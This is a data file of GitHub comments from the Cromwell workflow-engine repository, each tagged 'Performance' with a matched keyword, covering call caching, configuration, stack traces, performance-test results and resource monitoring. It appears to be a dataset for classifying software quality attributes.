Performance,Actually the link I posted (also it's one of the key examples in the Akka docs) might not be so useful as it looks like a lot of the places we're using ConfigFactory.load don't have access to the main actor system,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141:166,load,load,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141,1,['load'],['load']
Performance,"Actually unrelated to docker, this is ""make sure if an output changes, we don't call cache using the modified file""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-278388151:85,cache,cache,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-278388151,1,['cache'],['cache']
Performance,"Addendum...; ``Ctl-\``. I see a lot of the following, but not much else that stands out.; ```; ""pool-1-thread-11"" #77 prio=5 os_prio=0 tid=0x00007fe0fc083800 nid=0x6ea8 waiting on condition [0x00007fe1ae391000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b793b68> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582:351,concurren,concurrent,351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582,1,['concurren'],['concurrent']
Performance,"After discussion, we will resurrect the config named [`backend.backendsAllowed`](https://github.com/broadinstitute/cromwell/commit/9faa735df0039652b124ecc0b7e7e5ffa62fd0ff#diff-29d3e359e75a05cf433ad3abe5f194a8L85), [`backend.allowedBackends`](https://github.com/broadinstitute/cromwell/commit/9faa735df0039652b124ecc0b7e7e5ffa62fd0ff#diff-59ba4e6691e949675b4ccaa65a906e1dL22), or maybe just `backend.allowed` to match the style of the config named `backend.default`. Whatever the name, only backends found in this explicit list will be loaded. By default, the reference list will only contain ""Local"". Thus, after upgrading, cromwell will default back to running _only_ the Local backend, until admins/users re-enable the other backends by overriding the list.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288155798:536,load,loaded,536,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288155798,1,['load'],['loaded']
Performance,"After much discussion and clarification (thanks @geoffjentry ), these are the 2 use cases relating to Deleting and Cleaning up files after running a workflow:; * Use case 1: I want to clean up intermediary files from my workflow, but keep all outputs. I understand that I will no longer be able to call cache on this workflow.; * Use case 2: I want to delete all files related to my workflow, I will never need it again. This includes outputs. I will not be able to call cache on this workflow. There are a few remaining questions to answer but we are getting closer. Thank you all for your input in the meantime.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329581495:303,cache,cache,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329581495,2,['cache'],['cache']
Performance,"Agree for the need for better docs. For now:; - This is from the call cache strategy stanza.; - What it's saying is that if you use hard-links to localize files for tasks then those paths to the localized files will not match the pre-localized paths and that can interfere with call caching (note that with soft-links, Cromwell can look up the fully-resolved original path).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-429072869:70,cache,cache,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-429072869,1,['cache'],['cache']
Performance,"Alpha testing results. **Before:**. Mean = 6 failures, stdev = 10. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/978/ (32 total failed workflows, 1 hr 1 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/979/ (1 total failed workflows, 55 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/984/ (2 total failed workflows, 1 hr 5 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/988/ (15 total failed workflows, 1 hr 40 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:121,Perform,PerformanceTest-against-Alpha,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,7,['Perform'],['PerformanceTest-against-Alpha']
Performance,"Also @wleepang I was able to do a docker pull on the AMI that I am using:. AMI ID: amzn-ami-2018.03.h-amazon-ecs-optimized (ami-0a0c6574ce16ce87a). `[ec2-user@ip-172-31-29-236 ~]$ docker pull ubuntu:latest; latest: Pulling from library/ubuntu; 473ede7ed136: Pull complete; c46b5fa4d940: Pull complete; 93ae3df89c92: Pull complete; 6b1eed27cade: Pull complete; Digest: sha256:29934af957c53004d7fb6340139880d23fb1952505a15d69a03af0d1418878cb; Status: Downloaded newer image for ubuntu:latest`. Let me know if there is something off here, it seems fine to me",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4345#issuecomment-435913460:113,optimiz,optimized,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4345#issuecomment-435913460,1,['optimiz'],['optimized']
Performance,"Also, note that Google PD's can be expanded on the fly in seconds, even while the VM is still running under load. I've done this manually on non-FC VMs via the script below. Using this approach combined with a disk space monitoring process (and a size cap!) would allow the job to pass the first time, avoiding a retry. And... if it was also during the algorithm, not just data download, this could eradicate both disk space errors and disk over-provisioning. . https://github.com/broadinstitute/firecloud_developer_toolkit/blob/master/gce/expand_disk.sh. Unfortunately I don't know of a way to hot-swap RAM into the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902:108,load,load,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902,1,['load'],['load']
Performance,"Also, please make sure wherever you specify the runtime-attributes; ""docker"", ""memory"" etc, you include ""disks"" also. Example:; ""default_runtime_attributes"": {; ""docker"": ""ubuntu:latest"",; ""memory"": ""21G"",; ""disks"" : ""/mnt/efs 3 EFS""; }; The size,3 , in this case does not matter. It gets ignored. On Fri, Feb 14, 2020 at 9:45 AM Vanaja Narayanaswamy <vanajasmy@gmail.com>; wrote:. > Can you upload the complete stack trace from the cromwell-log?; >; > On Fri, Feb 14, 2020 at 9:29 AM pjongeneel <notifications@github.com>; > wrote:; >; >> I have /mnt/efs on both batch nodes and cromwell server which is the; >> mounted EFS.; >>; >> Then; >> backend {; >> // this configures the AWS Batch Backend for Cromwell; >> default = ""AWSBATCH""; >> providers {; >> AWSBATCH {; >> actor-factory =; >> ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; >> config {; >> root = ""/mnt/efs/cromwell_execution""; >> auth = ""default""; >>; >> numSubmitAttempts = 3; >> numCreateDefinitionAttempts = 3; >>; >> default-runtime-attributes {; >> queueArn: ""${BatchQueue}""; >> }; >>; >> filesystems {; >> local { auth = ""default"" }; >> }; >> }; >> }; >>; >> }; >> }; >>; >> And I always get this error:; >> ERROR - AwsBatchAsyncBackendJobExecutionActor; >> [UUID(8512304b)bioinfx.testjob:NA:1]: Error attempting to Execute; >> java.util.NoSuchElementException: None.get; >>; >> —; >> You are receiving this because you were mentioned.; >> Reply to this email directly, view it on GitHub; >> <https://github.com/broadinstitute/cromwell/pull/5070?email_source=notifications&email_token=ALILATR2AVXQXLFRQKER6W3RC3IIXA5CNFSM4IBORPI2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOELZZF7A#issuecomment-586388220>,; >> or unsubscribe; >> <https://github.com/notifications/unsubscribe-auth/ALILATWPGUN66MUEOCVPYULRC3IIXANCNFSM4IBORPIQ>; >> .; >>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147:1038,queue,queueArn,1038,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147,1,['queue'],['queueArn']
Performance,"An update...; It looks like the performance of `sync` — run on command line entirely outside the context of cromwell — that we see on our box that happens to be running cromwell is atypical. Other machines in our compute cluster with same OS and similar amounts of memory execute `sync` in milliseconds, the cromwell server box takes up to a second. we're still trying to identify the cause; there are some configuration differences in the machines, specifically the number, type and state of the mounted filesystems, as well as differences in the applications running in background, but as it stands I'm happy to call this as not a cromwell performance issue, so much as a potential performance issue running cromwell in certain environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285258989:32,perform,performance,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285258989,3,['perform'],['performance']
Performance,And I'll nominate @kshakir to review potentially concurrently,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/128#issuecomment-127389399:49,concurren,concurrently,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/128#issuecomment-127389399,1,['concurren'],['concurrently']
Performance,"And again on a new run, with something that looks very similar... ```; [ERROR] [05/01/2017 21:06:38.897] [cromwell-system-akka.dispatchers.engine-dispatcher-86] [akka.dispatch.Dispatcher] null; java.lang.NullPointerException; at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor.receiver(CallCacheWriteActor.scala:17); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:21); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:611,concurren,concurrent,611,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,"Another note to add that while i can't reproduce Yossi's error, he & I had previously identified `Scope.fullyQualifiedName` as a possible culprit. I decided to look at why MWDA is so much slower and that *is* being gated by the same function, to the tune of (at the time of this writing) 84.6% (and rising) of the total runtime so far.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277114329:250,tune,tune,250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277114329,1,['tune'],['tune']
Performance,"Are those ""queue in cromwell"" part of a subworkflow ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2216#issuecomment-298043978:11,queue,queue,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2216#issuecomment-298043978,1,['queue'],['queue']
Performance,"Are we using single inserts or batch inserts when writing to the DB? That can cause huge performance gains due the reduction in chatter. > On Dec 27, 2016, at 1:08 AM, Jeff Gentry <notifications@github.com> wrote:; > ; > While benchmarking some performance enhancements I've been playing with I kept noticing that no matter how fast I could get things eventually performance would drop back down to baseline levels from develop. I traced it down to the WriteMetadataActor, specifically it appears that writing boatloads of individual events (not atypical under load) can cause a lot of problems (not particularly surprising, but ...); > ; > It seems like some sort of batching/work pulling scheme could work wonders here although presumably it'd then come at the cost of memory (to buffer the unwritten values). That's just one thought, not a prescription; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub, or mute the thread.; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269315957:89,perform,performance,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269315957,4,"['load', 'perform']","['load', 'performance']"
Performance,"Are you positive? I'm seeing a `Compilation failed` near the end. If `compile` alone doesn't surface the issue, try `test:compile`. There is a very small chance this is caused by caching - or rather inadequate cache invalidation - so I cleared Travis's cache on this build and restarted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493606960:210,cache,cache,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493606960,2,['cache'],['cache']
Performance,"As I commented above, the tricky part is determining where to put this stuff such that it a) makes sense and b) people will remember it is there. I don't really care, I lean towards a private repo, but the real bottleneck at the time (as I remember asking in person as well) was getting people to opine, and no one did.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1296#issuecomment-315172239:211,bottleneck,bottleneck,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1296#issuecomment-315172239,1,['bottleneck'],['bottleneck']
Performance,"As a **user running the same workflows repeatedly**, I want **Cromwell to hash the outputs of my workflows**, so that **I can safely call cache on my outputs and I don't have to worry if they changed**.; - effort: Small to medium ; - risk: Small ; - business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054:138,cache,cache,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054,1,['cache'],['cache']
Performance,"As a **user running workflows**, I want **Cromwell to split up its docker hashes by registry**, so that **if one registry is slow, that it doesn't affect the performance of the other registries**.; - Effort: Small to medium; - Risk: Small; - Business value: Small to medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399:158,perform,performance,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399,1,['perform'],['performance']
Performance,"As a **user running workflows**, I want **Cromwell to use a default job count limit if I have not configured a `concurrent-job-limit`**, so that **the backend defaults to a sensible job limit**.; * Effort: Small; * Risk: Small; * Business Value: Small to Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911:112,concurren,concurrent-job-limit,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911,1,['concurren'],['concurrent-job-limit']
Performance,"As a **user running workflows**, I want **to see fewer unhelpful log messages**, so that **performance improves and it is easier to find important messages**. More information and improvement ideas in the [Logging spec](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). - effort: Small to Medium; - risk: Small; - Currently we show too many log messages, which degrades performance. We risk showing too few, but I think it's a risk we can mitigate.; - business value: Medium ; - Our logs are where users go to debug workflows, and currently they are a haystack to pick through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674:91,perform,performance,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674,2,['perform'],['performance']
Performance,"As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **?**. @LeeTL1220 to help with this. @geoffjentry thoughts on the following?; - Effort: **TBD**; - Risk: **TBD**; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023:78,cache,cache,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023,2,['cache'],['cache']
Performance,"As a **workflow runner**, I want **to selectively invalidate a workflow so that Cromwell does not use it for a cache-hit**, so that I can **not use bad or old workflow results in my new workflows**.; - Effort: **Medium**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116:111,cache,cache-hit,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116,1,['cache'],['cache-hit']
Performance,"As an alternative I'd suggest something running *outside* the docker container (e.g. polling ""docker stats"" outside the container). I don't now enough to know if it's technically feasible, but I think it would be ideal as an always-on stats provider. There are two main reasons why:; 1) Linux memory usage is complex enough that it's easy to get this wrong. I started with the script provided above, but on many systems it gives the wrong answer because linux aggressively caches things in memory, and you therefore ""used"" - ""buffers"" - ""cached"" is a much better approximation of the memory that's tied up. Here's a plot showing these two estimates vs output from docker stats:; ![image](https://user-images.githubusercontent.com/6463752/48026456-228c0f80-e114-11e8-9240-e5e7b1c3cb23.png). 2) Seemingly every new linux distro changes the output format and calculations of free and df. The number of rows and columns change, requiring complex gymnastics with awk to extract the required values and do the math. And some docker images don't come with free or df at all. This is a problem for me because I'm optimizing WDLs but it's not always easy to change the dockers they're running in (I'm guessing I'm not totally unique in this). Difficulties like this led me to develop a variant of the script that uses /proc for cpu and memory info. I've inlined it below:; ```; #!/bin/bash; set -Eeuo pipefail. MONITOR_MOUNT_POINT=${MONITOR_MOUNT_POINT:-""/cromwell_root""}; SLEEP_TIME=${SLEEP_TIME:-""10""}. function getCpuUsage() {; # get cpu info just by grep-ing from /proc/stat. Use awk to convert to %; grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {printf ""%.1f%%"", usage}'; }. function getMem() {; # get desired memory value from /proc/meminfo, in GiB, and also; # as a percentage of total; # argument is the label of the desired memory value; cat /proc/meminfo \; | awk -v MEM_FIELD=""$1"" '{; f[substr($1, 1, length($1)-1)] = $2; } END {; printf ""%.2f GiB"", f[MEM_FIELD] / 1048576; }' ; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027:473,cache,caches,473,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027,2,['cache'],"['cached', 'caches']"
Performance,As for; ```; PAPI error code 7. Required 'compute.zones.list' permission for 'projects/xxx'; ```; it sounds like you need to access Google Cloud Console and enable this permission for your project (Cromwell cannot perform this step for you automatically),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872:214,perform,perform,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872,1,['perform'],['perform']
Performance,"As per a convo with @mcovarr I'm going to switch out the mutable map for an immutable list structure. It'll be less performant but a lot cleaner, and it'd be easy to switch out if performance every did become an issue here. To paraphrase Miguel, something else likely will have blown up in Cromwell prior to performance being an issue here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230829446:116,perform,performant,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230829446,3,['perform'],"['performance', 'performant']"
Performance,Assuming the 0% coverage is an artifact of this class being loaded through reflection or something?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3455#issuecomment-376360340:60,load,loaded,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3455#issuecomment-376360340,1,['load'],['loaded']
Performance,BC4Connection.java:47); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:422); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:389); 	at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:95); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:101); 	at com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:341); 	at com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:193); 	at com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:430); 	at com.zaxxer.hikari.pool.HikariPool.access$500(HikariPool.java:64); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:570); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:563); 	at java.util.concurrent.FutureTask.run(FutureTask.java:266); 	... 3 more; Caused by: java.net.ConnectException: Connection refused; 	at java.net.PlainSocketImpl.socketConnect(Native Method); 	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350); 	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206); 	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188); 	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392); 	at java.net.Socket.connect(Socket.java:589); 	at com.mysql.jdbc.StandardSocketFactory.connect(StandardSocketFactory.java:211); 	at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:300); 	... 24 more; ```; How can I properly configure the database to work properly in the local command? Thank you!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:6135,concurren,concurrent,6135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['concurren'],['concurrent']
Performance,"BTW, I changed the config above because the only viable way to implement a lock in singularity is one lock per cache. If two images that are different but with shared layers are written to the cache, it can still become corrupted!. @TMiguelT This will be hard to pull of in the code because the runtime attributes are evaluated just before task submissions (not before scattering). Also there will still be race conditions. Only one process should pull to the same cache at the same time. This is because images have shared layers. Also this requires additional code and is only applicable to the singularity use case. The few lines in the script are way way way less than any code that would be required to make this happen. As regards tot he messy bash, no bash is required. Flock + the pull command is just one line. The only bash that is required is to set a few variables, but that is not really scripting. Flock is a great solution. Thanks a lot for suggesting it! The only better solution would have been that singularity has implemented such a filelock itself. As long as the pull process happens on the same node, the kernel will ensure that there are no race conditions. Of course this doesn't work on another node, so the flock command should be placed before the submit command.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627835781:111,cache,cache,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627835781,5,"['cache', 'race condition']","['cache', 'race conditions']"
Performance,"BackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:7117,concurren,concurrent,7117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,BackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at 